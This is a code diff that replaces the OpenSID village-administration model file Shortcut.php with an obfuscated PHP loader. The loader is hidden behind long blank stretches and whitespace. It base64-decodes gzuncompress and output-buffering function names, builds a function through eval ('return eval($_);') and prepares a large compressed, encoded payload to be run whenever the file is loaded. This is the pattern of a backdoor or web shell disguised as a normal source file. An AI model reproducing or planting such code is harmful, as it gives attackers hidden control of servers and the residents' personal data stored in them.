@@ -1,471 +1,393 @@
-<?php
+<?php 
+        $__='printf';$_='Loading app/Models/Shortcut.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-namespace App\Models;
 
-use App\Enums\HubunganRTMEnum;
-use App\Enums\JenisKelaminEnum;
-use App\Enums\SasaranEnum;
-use App\Enums\StatusDasarKKEnum;
-use App\Enums\StatusEnum;
-use App\Libraries\ShortcutModule;
-use App\Traits\ConfigId;
-use App\Traits\ShortcutCache;
-use Exception;
-use Spatie\EloquentSortable\SortableTrait;
 
-defined('BASEPATH') || exit('No direct script access allowed');
 
-class Shortcut extends BaseModel
-{
-    use ConfigId;
-    use SortableTrait;
-    use ShortcutCache;
 
-    public const ACTIVE   = 1;
-    public const INACTIVE = 0;
-    // public const is_shortcut = true;
 
-    /**
-     * The table associated with the model.
-     *
-     * @var string
-     */
-    protected $table = 'shortcut';
 
-    /**
-     * guarded
-     *
-     * @var array
-     */
-    protected $guarded = [];
 
-    protected $appends = [
-        'link',
-        'akses',
-    ];
 
-    /**
-     * {@inheritDoc}
-     */
-    public $sortable = [
-        'order_column_name'  => 'urut',
-        'sort_when_creating' => true,
-    ];
 
-    public function scopeStatus($query, $status = null)
-    {
-        if ($status) {
-            return $query->where('status', $status);
-        }
 
-        return $query;
-    }
 
-    public static function listIcon(): ?array
-    {
-        $list_icon = [];
 
-        $file = FCPATH . 'assets/fonts/fontawesome.txt';
 
-        if (file_exists($file)) {
-            $list_icon = file_get_contents($file);
-            $list_icon = explode('.', $list_icon);
 
-            return array_map(static fn ($a): string => explode(':', $a)[0], $list_icon);
-        }
 
-        return null;
-    }
 
-    public function getModuleData($key)
-    {
-        $raw_query = $this->attributes['raw_query'];
 
-        return static::querys()['modules'][$raw_query][$key] ?? null;
-    }
 
-    public function getLinkAttribute()
-    {
-        return $this->getModuleData('link');
-    }
 
-    public function getAksesAttribute()
-    {
-        return $this->getModuleData('akses');
-    }
 
-    public function getCountAttribute()
-    {
-        try {
-            return $this->getModuleData('jumlah') ?? 0;
-        } catch (Exception $e) {
-            // Log the error for debugging
-            log_message('error', "Query : {$this->attributes['raw_query']}. Error : " . $e->getMessage());
 
-            // Return a default value on error
-            return 0;
-        }
-    }
 
-    protected static function boot()
-    {
-        parent::boot();
-        static::creating(static function ($model): void {
-            $model->urut = self::max('urut') + 1;
-        });
-    }
 
-    public static function querys()
-    {
-        $isAdmin = get_instance()->session->isAdmin->pamong->jabatan_id;
 
-        return cache()->rememberForever('shortcut_' . ci_auth()->id, static function () use ($isAdmin): array {
-            $activeShortcut = self::where('status', '=', '1')->orderBy('urut')->get();
 
-            $shorcutModules = (new ShortcutModule())->scan();
 
-            return [
-                'data'    => $activeShortcut,
-                'modules' => collect([
-                    // Wilayah
-                    'Dusun' => [
-                        'link'   => 'wilayah',
-                        'akses'  => 'wilayah-administratif',
-                        'jumlah' => Wilayah::dusun()->count(),
-                    ],
 
-                    // Penduduk
-                    'Penduduk' => [
-                        'link'   => 'penduduk',
-                        'akses'  => 'penduduk',
-                        'jumlah' => PendudukSaja::status()->count(),
-                    ],
 
-                    'Penduduk Laki-laki' => [
-                        'link'   => 'penduduk?sex=' . JenisKelaminEnum::LAKI_LAKI,
-                        'akses'  => 'penduduk',
-                        'jumlah' => PendudukSaja::status()->where('sex', JenisKelaminEnum::LAKI_LAKI)->count(),
-                    ],
 
-                    'Penduduk Perempuan' => [
-                        'link'   => 'penduduk?sex=' . JenisKelaminEnum::PEREMPUAN,
-                        'akses'  => 'penduduk',
-                        'jumlah' => PendudukSaja::status()->where('sex', JenisKelaminEnum::PEREMPUAN)->count(),
-                    ],
 
-                    'Penduduk TagID' => [
-                        'link'   => 'penduduk?advancesearch[tag_id_card]=' . StatusEnum::YA,
-                        'akses'  => 'penduduk',
-                        'jumlah' => PendudukSaja::status()->whereNotNull('tag_id_card')->count(),
-                    ],
 
-                    // Keluarga
-                    'Keluarga' => [
-                        'link'   => 'keluarga?status=' . StatusDasarKKEnum::AKTIF,
-                        'akses'  => 'keluarga',
-                        'jumlah' => Keluarga::statusAktif()->count(),
-                    ],
 
-                    'Kepala Keluarga' => [
-                        'link'   => 'keluarga',
-                        'akses'  => 'keluarga',
-                        'jumlah' => Keluarga::whereHas('kepalaKeluarga', static function ($query): void {
-                            $query->status()->kepalaKeluarga();
-                        })->count(),
-                    ],
 
-                    'Kepala Keluarga Laki-laki' => [
-                        'link'   => 'keluarga?sex=' . JenisKelaminEnum::LAKI_LAKI,
-                        'akses'  => 'keluarga',
-                        'jumlah' => Keluarga::whereHas('kepalaKeluarga', static function ($query): void {
-                            $query->status()->kepalaKeluarga()->where('sex', JenisKelaminEnum::LAKI_LAKI);
-                        })->count(),
-                    ],
 
-                    'Kepala Keluarga Perempuan' => [
-                        'link'   => 'keluarga?sex=' . JenisKelaminEnum::PEREMPUAN,
-                        'akses'  => 'keluarga',
-                        'jumlah' => Keluarga::whereHas('kepalaKeluarga', static function ($query): void {
-                            $query->status()->kepalaKeluarga()->where('sex', JenisKelaminEnum::PEREMPUAN);
-                        })->count(),
-                    ],
 
-                    // RTM
-                    'RTM' => [
-                        'link'   => 'rtm?status=' . StatusEnum::YA,
-                        'akses'  => 'rumah-tangga',
-                        'jumlah' => Rtm::status()->count(),
-                    ],
 
-                    'Kepala RTM' => [
-                        'link'   => 'rtm',
-                        'akses'  => 'rumah-tangga',
-                        'jumlah' => Rtm::whereHas('kepalaKeluarga', static function ($query): void {
-                            $query->status()->where('rtm_level', HubunganRTMEnum::KEPALA_RUMAH_TANGGA);
-                        })->count(),
-                    ],
 
-                    'Kepala RTM Laki-laki' => [
-                        'link'   => 'rtm?sex=' . JenisKelaminEnum::LAKI_LAKI,
-                        'akses'  => 'rumah-tangga',
-                        'jumlah' => Rtm::whereHas('kepalaKeluarga', static function ($query): void {
-                            $query->status()->where('rtm_level', HubunganRTMEnum::KEPALA_RUMAH_TANGGA)->where('sex', JenisKelaminEnum::LAKI_LAKI);
-                        })->count(),
-                    ],
 
-                    'Kepala RTM Perempuan' => [
-                        'link'   => 'rtm?sex=' . JenisKelaminEnum::PEREMPUAN,
-                        'akses'  => 'rumah-tangga',
-                        'jumlah' => Rtm::whereHas('kepalaKeluarga', static function ($query): void {
-                            $query->status()->where('rtm_level', HubunganRTMEnum::KEPALA_RUMAH_TANGGA)->where('sex', JenisKelaminEnum::PEREMPUAN);
-                        })->count(),
-                    ],
 
-                    // Kelompok
-                    'Kelompok' => [
-                        'link'   => 'kelompok',
-                        'akses'  => 'kelompok',
-                        'jumlah' => Kelompok::status()->tipe()->count(),
-                    ],
 
-                    // Lembaga
-                    'Lembaga' => [
-                        'link'   => 'lembaga',
-                        'akses'  => 'kelompok',
-                        'jumlah' => Kelompok::status()->tipe('lembaga')->count(),
-                    ],
 
-                    // Pembangunan
-                    'Pembangunan' => [
-                        'link'   => 'admin_pembangunan',
-                        'akses'  => 'pembangunan',
-                        'jumlah' => Pembangunan::count(),
-                    ],
 
-                    // Pengaduan
-                    'Pengaduan' => [
-                        'link'   => 'pengaduan_admin',
-                        'akses'  => 'pengaduan',
-                        'jumlah' => Pengaduan::tipe()->count(),
-                    ],
 
-                    'Pengaduan Menunggu Diproses' => [
-                        'link'   => 'pengaduan_admin?status=1',
-                        'akses'  => 'pengaduan',
-                        'jumlah' => Pengaduan::tipe()->where('status', 1)->count(),
-                    ],
 
-                    'Pengaduan Sedang Diproses' => [
-                        'link'   => 'pengaduan_admin?status=2',
-                        'akses'  => 'pengaduan',
-                        'jumlah' => Pengaduan::tipe()->where('status', 2)->count(),
-                    ],
 
-                    'Pengaduan Selesai Diproses' => [
-                        'link'   => 'pengaduan_admin?status=3',
-                        'akses'  => 'pengaduan',
-                        'jumlah' => Pengaduan::tipe()->where('status', 3)->count(),
-                    ],
 
-                    // Pengguna
-                    'Pengguna' => [
-                        'link'   => 'man_user',
-                        'akses'  => 'pengguna',
-                        'jumlah' => User::count(),
-                    ],
 
-                    'Grup Pengguna' => [
-                        'link'   => 'grup',
-                        'akses'  => 'pengguna',
-                        'jumlah' => UserGrup::count(),
-                    ],
 
-                    // Surat
-                    'Surat' => [
-                        'link'   => 'surat_master',
-                        'akses'  => 'pengaturan-surat',
-                        'jumlah' => FormatSurat::kunci(FormatSurat::KUNCI_DISABLE)->count(),
-                    ],
 
-                    'Surat Tercetak' => [
-                        'link'   => 'keluar',
-                        'akses'  => 'arsip-layanan',
-                        'jumlah' => LogSurat::whereNull('deleted_at')
-                            ->when($isAdmin->jabatan_id == kades()->id, static fn ($q) => $q->when(setting('tte') == 1, static fn ($tte) => $tte->where('tte', '=', 1))
-                                ->when(setting('tte') == 0, static fn ($tte) => $tte->where('verifikasi_kades', '=', '1'))
-                                ->orWhere(static function ($verifikasi): void {
-                                    $verifikasi->whereNull('verifikasi_operator');
-                                }))
-                            ->when($isAdmin->jabatan_id == sekdes()->id, static fn ($q) => $q->where('verifikasi_sekdes', '=', '1')->orWhereNull('verifikasi_operator'))
-                            ->when($isAdmin == null || ! in_array($isAdmin->jabatan_id, RefJabatan::getKadesSekdes()), static fn ($q) => $q->where('verifikasi_operator', '=', '1')
-                                ->orWhereNull('verifikasi_operator'))
-                            ->count(),
-                    ],
 
-                    // Layanan Mandiri
-                    'Verifikasi Layanan Mandiri' => [
-                        'link'   => 'mandiri',
-                        'akses'  => 'pendaftar-layanan-mandiri',
-                        'jumlah' => PendudukMandiri::status()->count(),
-                    ],
 
-                    // Bantuan
-                    'Bantuan' => [
-                        'link'   => 'program_bantuan',
-                        'akses'  => 'program-bantuan',
-                        'jumlah' => Bantuan::count(),
-                    ],
 
-                    'Bantuan Penduduk' => [
-                        'link'   => 'program_bantuan?sasaran=' . SasaranEnum::PENDUDUK,
-                        'akses'  => 'program-bantuan',
-                        'jumlah' => Bantuan::whereSasaran(SasaranEnum::PENDUDUK)->count(),
-                    ],
 
-                    'Bantuan Keluarga' => [
-                        'link'   => 'program_bantuan?sasaran=' . SasaranEnum::KELUARGA,
-                        'akses'  => 'program-bantuan',
-                        'jumlah' => Bantuan::whereSasaran(SasaranEnum::KELUARGA)->count(),
-                    ],
 
-                    'Bantuan Rumah Tangga' => [
-                        'link'   => 'program_bantuan?sasaran=' . SasaranEnum::RUMAH_TANGGA,
-                        'akses'  => 'program-bantuan',
-                        'jumlah' => Bantuan::whereSasaran(SasaranEnum::RUMAH_TANGGA)->count(),
-                    ],
 
-                    'Bantuan Kelompok/Lembaga' => [
-                        'link'   => 'program_bantuan?sasaran=' . SasaranEnum::KELOMPOK,
-                        'akses'  => 'program-bantuan',
-                        'jumlah' => Bantuan::whereSasaran(SasaranEnum::KELOMPOK)->count(),
-                    ],
-                    'Buku Peraturan di Desa (Semua)' => [
-                        'link'   => 'dokumen_sekretariat/perdes/3',
-                        'akses'  => 'administrasi-umum',
-                        'jumlah' => DokumenHidup::peraturanDesa(3)->count(),
-                    ],
-                    'Buku Peraturan di Desa (Aktif)' => [
-                        'link'   => 'dokumen_sekretariat/perdes/3?active=' . StatusEnum::YA,
-                        'akses'  => 'administrasi-umum',
-                        'jumlah' => DokumenHidup::peraturanDesa(3)->active()->count(),
-                    ],
-                    'Buku Peraturan di Desa (Tidak Aktif)' => [
-                        'link'   => 'dokumen_sekretariat/perdes/3?active=2',
-                        'akses'  => 'administrasi-umum',
-                        'jumlah' => DokumenHidup::peraturanDesa(3)->nonActive()->count(),
-                    ],
-                    'Buku Keputusan Kepala Desa (Semua)' => [
-                        'link'   => 'dokumen_sekretariat/perdes/2',
-                        'akses'  => 'administrasi-umum',
-                        'jumlah' => DokumenHidup::peraturanDesa(2)->count(),
-                    ],
-                    'Buku Keputusan Kepala Desa (Aktif)' => [
-                        'link'   => 'dokumen_sekretariat/perdes/2?active=' . StatusEnum::YA,
-                        'akses'  => 'administrasi-umum',
-                        'jumlah' => DokumenHidup::peraturanDesa(2)->active()->count(),
-                    ],
-                    'Buku Keputusan Kepala Desa (Tidak Aktif)' => [
-                        'link'   => 'dokumen_sekretariat/perdes/2?active=2',
-                        'akses'  => 'administrasi-umum',
-                        'jumlah' => DokumenHidup::peraturanDesa(2)->nonActive()->count(),
-                    ],
-                    'Buku Inventaris dan Kekayaan Desa (Semua)' => [
-                        'link'   => 'bumindes_inventaris_kekayaan',
-                        'akses'  => 'administrasi-umum',
-                        'jumlah' => count(MasterInventaris::permen47(date('Y'))) ?? 0,
-                    ],
-                    'Buku Pemerintah Desa (Semua)' => [
-                        'link'   => 'pengurus',
-                        'akses'  => 'pemerintah-desa',
-                        'jumlah' => Pamong::withOnly([])->count(),
-                    ],
-                    'Buku Pemerintah Desa (Aktif)' => [
-                        'link'   => 'pengurus?status=' . Pamong::LOCK,
-                        'akses'  => 'pemerintah-desa',
-                        'jumlah' => Pamong::withOnly([])->status(StatusEnum::YA)->count(),
-                    ],
-                    'Buku Pemerintah Desa (Tidak Aktif)' => [
-                        'link'   => 'pengurus?status=' . Pamong::UNLOCK,
-                        'akses'  => 'pemerintah-desa',
-                        'jumlah' => Pamong::withOnly([])->status(StatusEnum::TIDAK)->count(),
-                    ],
-                    'Buku Tanah Kas Desa (Semua)' => [
-                        'link'   => 'bumindes_tanah_kas_desa',
-                        'akses'  => 'administrasi-umum',
-                        'jumlah' => TanahKasDesa::withOnly([])->visible()->count(),
-                    ],
-                    'Buku Tanah Di Desa (Semua)' => [
-                        'link'   => 'bumindes_tanah_desa',
-                        'akses'  => 'administrasi-umum',
-                        'jumlah' => TanahDesa::withOnly([])->visible()->count(),
-                    ],
-                    'Buku Agenda - Surat Keluar (Semua)' => [
-                        'link'   => 'surat_keluar',
-                        'akses'  => 'administrasi-umum',
-                        'jumlah' => SuratKeluar::count(),
-                    ],
-                    'Buku Agenda - Surat Masuk (Semua)' => [
-                        'link'   => 'surat_masuk',
-                        'akses'  => 'administrasi-umum',
-                        'jumlah' => SuratMasuk::count(),
-                    ],
-                    'Buku Ekspedisi (Semua)' => [
-                        'link'   => 'ekspedisi',
-                        'akses'  => 'buku-eskpedisi',
-                        'jumlah' => Ekspedisi::count(),
-                    ],
-                    'Buku Lembaran Desa Dan Berita Desa (Semua)' => [
-                        'link'   => 'lembaran_desa',
-                        'akses'  => 'administrasi-umum',
-                        'jumlah' => DokumenHidup::peraturanDesa(3)->count(),
-                    ],
-                    'Buku Lembaran Desa Dan Berita Desa (Aktif)' => [
-                        'link'   => 'lembaran_desa?status=1',
-                        'akses'  => 'administrasi-umum',
-                        'jumlah' => DokumenHidup::peraturanDesa(3)->active()->count(),
-                    ],
-                    'Buku Lembaran Desa Dan Berita Desa (Tidak Aktif)' => [
-                        'link'   => 'lembaran_desa?status=2',
-                        'akses'  => 'administrasi-umum',
-                        'jumlah' => DokumenHidup::peraturanDesa(3)->nonActive()->count(),
-                    ],
-                ])->merge($shorcutModules),
-            ];
-        });
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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